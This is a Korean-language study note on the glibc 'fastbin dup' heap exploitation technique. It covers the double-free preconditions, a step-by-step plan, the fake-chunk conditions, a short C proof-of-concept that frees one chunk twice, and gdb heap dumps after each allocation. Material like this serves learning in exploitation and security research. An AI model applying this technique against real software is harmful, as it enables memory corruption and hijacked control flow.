# **fastbin-dup**

## **Exploit Condition**

* 공격자에 의해 동일한 크기의 Fast Chunk의 할당과 해제가 자유로워야 한다.
* 공격자에 의해 해제된 Fast Chunk를 한 번 더 해제할 수 있어야 한다.(Double Free Bug)

## **Exploit Plan**

1. 동일한 크기의 Fast Chunk 3개 생성한다.
1. 첫 번째 Fast Chunk 해제한다.
1. 두 번째 Fast Chunk 해제한다.
1. 첫 번째 Fast Chunk 해제한다
1. 이전과 동일한 크기로 힙을 할당하고 **Fake Chunk** 쓴다.
1. 동일한 크기로 Fast Chunk 2개 생성한다.
1. 다음에 할당하는 영역에 원하는 값 쓴다.

A -> B -> A 로 해제하는 이유는 동일한 공간을 연속으로 해제하는 경우 double free or corruption이 발생하기 때문이다.

5번째에 동일한 크기로 힙을 할당하는 경우 첫 번째 A가 할당되는데 여기에 값을 쓸 수 있다면 Fake Chunk로 조작이 가능하다.

![fastbin_dup_malloc](/Resources/img/fastbin_dup_malloc.png)

원래 세 번째 A의 FD 값에는 아무 값도 없기 때문에 다음 청크가 없었지만, 첫 번째 A가 할당되면서 FD, BK 부분이 데이터 영역으로 변했고, Fake Chunk 값을 쓰면 세 번째 A의 FD가 변조된다.  

Fake Chunk의 조건

* 이전 Chunk의 Size와 Fake Chunk의 Size가 동일해야 함
* 우리가 변조하고자 하는 주소보다 작은 주소에 위치해야 함

## **Exploit Flow**

```c
#include <stdio.h>
#include <stdlib.h>
 
int main()
{
        int *buf1 = malloc(112);
        int *buf2 = malloc(112);
        int *buf3 = malloc(112);
 
        free(buf1);
        free(buf2);
        free(buf1);
 
        int *buf4 = malloc(112);
        int *buf5 = malloc(112);
        int *buf6 = malloc(112);
}
```

3번째 Free 다음 fastbin 구조 

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x602000 --> 0x602080 --> 0x602000 (overlap chunk with 0x602000(freed) )
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602180 (size : 0x20e80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

buf4 malloc 후 구조

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x602080 --> 0x602000 --> 0x602080 (overlap chunk with 0x602080(freed) )
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602180 (size : 0x20e80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0

```

buf5 malloc 후 구조

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x602000 --> 0x602080 --> 0x602000 (overlap chunk with 0x602000(freed) )
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602180 (size : 0x20e80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0

```

buf6 malloc 후 구조

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x602080 --> 0x602000 --> 0x602080 (overlap chunk with 0x602080(freed) )
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602180 (size : 0x20e80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0

```

**fastbinsY의 변화**  
0x602000 → 0x602080 → 0x602000 → 0x602080  

fastbins는 Free Chunk를 Single list로 관리한다. 동일한 크기의 Fast Chunk 여러개가 해제되면, Chunk의 fd 영역을 이용해 관리한다.

**References**  
<https://www.lazenca.net/display/TEC/fastbin_dup>  
<https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c>  
<https://bpsecblog.wordpress.com/2016/08/31/translate_fastbin/>  
<https://bachs.tistory.com/entry/HITCON-Training-lab12-Fastbin-Attack?category=961837>

